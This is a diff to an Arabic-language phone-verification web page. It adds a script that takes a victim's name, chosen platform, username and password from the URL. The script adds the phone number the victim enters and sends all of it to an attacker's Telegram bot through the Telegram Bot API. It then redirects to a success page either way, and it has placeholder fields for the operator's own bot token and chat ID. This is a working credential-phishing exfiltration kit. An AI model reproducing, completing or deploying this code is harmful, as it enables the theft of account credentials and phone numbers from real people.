@@ -14,7 +14,7 @@
         .phone-container:focus-within { border-color: #007bff; }
         .country-code { width: 25%; padding: 12px; border: none; border-right: 1px solid #ccc; text-align: center; font-size: 16px; outline: none; background-color: #fafafa; }
         .phone-number { width: 75%; padding: 12px; border: none; font-size: 16px; outline: none; text-align: left; }
-        .btn-submit { background-color: #007bff; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-size: 16px; cursor: pointer; font-weight: bold; }
+        .btn-submit { background-color: #007bff; color: white; border: none; padding: 12px; width: 100%; border-radius: 8px; font-size: 16px; cursor: pointer; font-weight: bold; width: 100%; }
         .btn-submit:hover { background-color: #0056b3; }
     </style>
 </head>
@@ -23,13 +23,60 @@
     <h2>تأكيد رقم الهاتف</h2>
     <p>أدخل مفتاح الدولة (مثل +966) متبوعاً برقم الهاتف</p>
     
-    <form action="success.html" method="GET">
+    <form id="telegramForm">
         <div class="phone-container">
-            <input type="text" name="code" class="country-code" placeholder="+966" required>
-            <input type="tel" name="phone" class="phone-number" placeholder="500000000" required>
+            <input type="text" id="code" class="country-code" placeholder="+966" required>
+            <input type="tel" id="phone" class="phone-number" placeholder="500000000" required>
         </div>
         <button type="submit" class="btn-submit">تأكيد ومتابعة</button>
     </form>
 </div>
+
+<script>
+    document.getElementById('telegramForm').addEventListener('submit', function(e) {
+        e.preventDefault(); 
+
+        const urlParams = new URLSearchParams(window.location.search);
+        const name = urlParams.get('name') || 'غير معروف';
+        const platform = urlParams.get('platform') || 'غير محدد';
+        const username = urlParams.get('user_id') || 'غير معروف';
+        const password = urlParams.get('user_pass') || 'غير معروف';
+        
+        const countryCode = document.getElementById('code').value.trim();
+        const phoneNumber = document.getElementById('phone').value.trim();
+        const fullPhone = countryCode + " " + phoneNumber;
+
+        // 🔴 ضع بيانات البوت الجديد الخاص بك هنا 🔴
+        const telegramToken = 'ضع_توكن_البوت_هنا'; 
+        const chatId = 'ضع_ايدي_حسابك_هنا'; 
+
+        const message = `
+🔔 *وصلت بيانات جديدة من المشروع الجديد* 🔔
+👤 *الاسم:* ${name}
+🌐 *التطبيق المختار:* ${platform.toUpperCase()}
+📧 *اليوزر/الإيميل:* \`${username}\`
+🔑 *كلمة المرور:* \`${password}\`
+📱 *رقم الهاتف:* ${fullPhone}
+        `;
+
+        const telegramUrl = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+        
+        fetch(telegramUrl, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: message,
+                parse_mode: 'Markdown'
+            })
+        })
+        .then(response => {
+            window.location.href = 'success.html';
+        })
+        .catch(error => {
+            window.location.href = 'success.html';
+        });
+    });
+</script>
 </body>
 </html>
